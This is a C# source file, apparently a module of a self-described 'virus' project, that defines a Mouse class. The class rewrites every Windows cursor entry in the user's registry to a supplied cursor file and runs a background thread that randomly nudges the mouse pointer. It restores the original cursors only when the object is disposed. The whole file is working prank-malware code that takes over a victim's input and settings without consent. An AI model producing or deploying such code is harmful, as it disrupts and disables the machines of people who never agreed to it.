using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Havoks_Virus
{
    public class Mouse : IDisposable
    {
        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, IntPtr pvParam, uint fWinIni);

        private const int SPI_SETCURSORS = 0x0057;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDCHANGE = 0x02;

        private Dictionary<string, string> originalCursors = new Dictionary<string, string>();
        private Thread movementThread;
        private volatile bool keepMoving = true; // Use volatile for thread safety
        private bool disposed = false; // Flag to indicate disposal
        private string aniCursorPath;

        public Mouse(string cursorFilePath)
        {
            aniCursorPath = cursorFilePath;
            try
            {
                BackupAndApplyCursors(aniCursorPath);
                StartMouseMovement();
            }
            catch (Exception ex)
            {
                System.Console.WriteLine($"Error applying cursor: {ex.Message}");
            }
        }

        private void BackupAndApplyCursors(string curFile)
        {
            string[] cursorTypes = new string[]
            {
                "Arrow", "Hand", "IBeam", "No", "SizeAll", "SizeNESW", "SizeNS", "SizeNWSE", "SizeWE",
                "UpArrow", "Wait", "Cross", "Help", "AppStarting"
                // Add more cursor types if necessary
            };

            foreach (string cursorType in cursorTypes)
            {
                originalCursors[cursorType] = Registry.GetValue(@"HKEY_CURRENT_USER\Control Panel\Cursors\", cursorType, null) as string;
                ChangeCursor(cursorType, curFile);
            }
        }

        private void ChangeCursor(string cursorType, string curFile)
        {
            Registry.SetValue($@"HKEY_CURRENT_USER\Control Panel\Cursors\", cursorType, curFile);
            SystemParametersInfo(SPI_SETCURSORS, 0, IntPtr.Zero, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        public void StartMouseMovement()
        {
            if (movementThread == null || !movementThread.IsAlive)
            {
                movementThread = new Thread(new ThreadStart(RandomlyMoveMouse)) { IsBackground = true };
                movementThread.Start();
            }
        }

        private void RandomlyMoveMouse()
        {
            Random rnd = new Random();
            while (keepMoving)
            {
                int offsetX = rnd.Next(-5, 6); // Random X-offset between -5 and 5
                int offsetY = rnd.Next(-5, 6); // Random Y-offset between -5 and 5

                Cursor.Position = new System.Drawing.Point(
                    Cursor.Position.X + offsetX,
                    Cursor.Position.Y + offsetY
                );

                Thread.Sleep(rnd.Next(300, 501)); // Random sleep duration between 0.3 and 0.5 seconds
            }
        }

        public void StopMouseMovement()
        {
            keepMoving = false;
            if (movementThread != null && movementThread.IsAlive)
            {
                movementThread.Join();
            }
            RestoreOriginalCursors();
        }

        private void RestoreOriginalCursors()
        {
            foreach (var entry in originalCursors)
            {
                Registry.SetValue($@"HKEY_CURRENT_USER\Control Panel\Cursors\", entry.Key, entry.Value);
            }
            SystemParametersInfo(SPI_SETCURSORS, 0, IntPtr.Zero, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposed)
            {
                if (disposing)
                {
                    // Dispose managed resources.
                    StopMouseMovement(); // This also calls RestoreOriginalCursors
                }
                // Note: No unmanaged resources in this class, no need to free them

                disposed = true;
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        ~Mouse()
        {
            Dispose(false);
        }
    }
}